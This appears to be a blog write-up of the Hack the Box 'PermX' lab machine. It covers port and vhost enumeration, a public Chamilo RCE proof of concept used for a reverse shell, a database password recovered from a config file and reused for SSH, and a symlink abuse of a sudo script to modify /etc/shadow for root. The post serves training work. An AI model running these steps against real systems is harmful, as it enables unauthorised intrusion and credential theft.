---
draft: false
title: "Hack the Box #3 - PermX without Metasploit"
date: 2024-07-30
author: William
category:
  - Tech
tags:
  - Linux
  - Security
  - Hacking
cover:
  image: hack_the_box_3_permx.png
  alt: hack_the_box_3_permx.png
---
I've been messing with retired boxes on Hack the box and thought i would finally try my hand on one of the active ones!

---
## Enumeration

So as per lets start with an nmap scan.
```bash
# Nmap 7.94SVN scan initiated Sat Jul 27 09:05:17 2024 as: nmap -sV -p- -o nmap.scan 10.10.11.23
Nmap scan report for permx.htb (10.10.11.23)
Host is up (0.062s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
# Nmap done at Sat Jul 27 09:06:05 2024 -- 1 IP address (1 host up) scanned in 48.48 seconds

```

In doing so we find ports 22, 80 open. Both versions seem secure so lets have a look at the website.

> sudo vim /etc/hosts

Adding [http://permx.htb/](http://permx.htb/) Looks like some elearning site. Inspecting the page source shows there is an underlying page but none of the urls load anything of interest.

```bash
/.htaccess           [33m (Status: 403)[0m [Size: 274]
/.htpasswd           [33m (Status: 403)[0m [Size: 274]
/.hta                [33m (Status: 403)[0m [Size: 274]
/css                 [36m (Status: 301)[0m [Size: 304][34m [--> <http://permx.htb/css/>][0m
/img                 [36m (Status: 301)[0m [Size: 304][34m [--> <http://permx.htb/img/>][0m
/index.html          [32m (Status: 200)[0m [Size: 36182]
/js                  [36m (Status: 301)[0m [Size: 303][34m [--> <http://permx.htb/js/>][0m
/lib                 [36m (Status: 301)[0m [Size: 304][34m [--> <http://permx.htb/lib/>][0m
/server-status       [33m (Status: 403)[0m [Size: 274]
```

With some further subdirectory enumeration with gobuster We have some denied and an open directory but nothing of serious interest. Lets see if we have any subdomains of interest???

Weirdly is wasn’t getting much success with with the generic **ffuf** method of:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://FUZZ.permx.htb -mc 200
```

This doesn't seem right. It isn't even detecting the www root that I am connected to… After a little bit of research I found another way to make the query.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u <http://10.10.11.23> -H "Host: FUZZ.permx.htb" -mc 200
```

What is the difference you might ask? The former is sending out a request to DNS servers for what other subdomains it could connect to. Where the latter is sending requests directly to the IP Address im trying to hit…

And after running the command against the VHOST we get

**lms.permx.htb**

WHY IS IT ALWAYS DNS!!!!!!!

Lets add this bad boy to our hosts file and lets see what we got… Looks like we have a login page with the administrator mentioned at the bottom.

![LoginPage](https://i.imgur.com/7BQRrzZ.png#center)

+1 to email admin@permx.htb love you Davis Miller

---
## Exploitation 

In digging through the source to determine what version of Chamilo we are dealing with I could only determine **Chamilo 1** thinking it wouldn't get me to far without a specific version but google is a bountiful place with a simple **Chamilo 1 exploit** search we find a PoC put together by m3m0o [m3m0o/chamilo-lms-unauthenticated-rce](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc) Thanks mate love you.

Downloading this and reviewing the exploit it can either check for the vulnerability, drop a webshell or a reverse shell using the exploit. Well I'm feeling vrevshelly today :D

![ReverseShell](https://i.imgur.com/GM5Qp5D.png#center)

Looks like we are **www-data** but we can still read the etc/passwd looks to be a single human user of mtz that's where our user flag will be… Lets start enumerating this box and see how we can get it.

In poking around we get this find an interesting file...
```bash
└─$ find / -type f -name "*config*" 2>/dev/null 
...
/var/www/chamilo/app/config/configuration.php
...

└─$ cat "/var/www/chamilo/app/config/configuration.php" | grep "db_user\\|db_pass"
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
```

Great we have been able to acquire the database username and password.

Trying to login to the Chamilo portal the user doesn't work. Good. Lets try it with the user **mtz**.

```bash
└─$ ssh mtz@10.10.11.23
mtz@10.10.11.23's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)
...
mtz@permx:~$ cat user.txt
==============USER_FLAG_STRING==============
```

I’m in and we got the flag… Now to escalate to root!

---
## Privilege Escalation 

Lets start by enumerating what processes can be run as superuser.
```bash
mtz@permx:~$ find / -perm -u=s -type f 2>/dev/null
...
/usr/libexec/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

There are some interesting ones at the bottom of this lookup. Digging into polkit, we are running version 0.105-33 and with a cursery search on exploit_db we find this bad boy [exploit-db](https://www.exploit-db.com/exploits/50011)

After running this a couple times however we have no success. The script is unable to create a user. Lets see what this user can run...

```bash
mtz@permx:~$ sudo -l
Matching Defaults entries for mtz on permx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty

User mtz may run the following commands on permx:
    (ALL : ALL) NOPASSWD: /opt/acl.sh
```

We can run **[acl.sh](http://acl.sh)** as a sudo user without a password. Looking at the script is assigns permissions to a given target file but does restrict the user to only be able to run it on their home directory. We can’t edit this file but we can abuse the security check by creating a symbolic link to root.
```bash
mtz@permx:~$ ln -s / root # Create temp symbolic link
mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow # GIB SHADOW FILE PERMS
mtz@permx:~$ vim /etc/shadow 
```

Here we can pull the hashed root password and crack it… or we can just overwrite it with mtz password then we can `su root` input mtz password and BAM!!!

```bash
mtz@permx:~$ su root
Password: 
root@permx:/home/mtz# cat /root/root.txt
==============ROOT_FLAG_STRING==============
```

We got the root flag baby! And this [rubber stamp of approval](https://www.hackthebox.com/achievement/machine/1695260/613) from hack the box. My smooth brain feels satisfied. I'm going to go touch some grass now :D

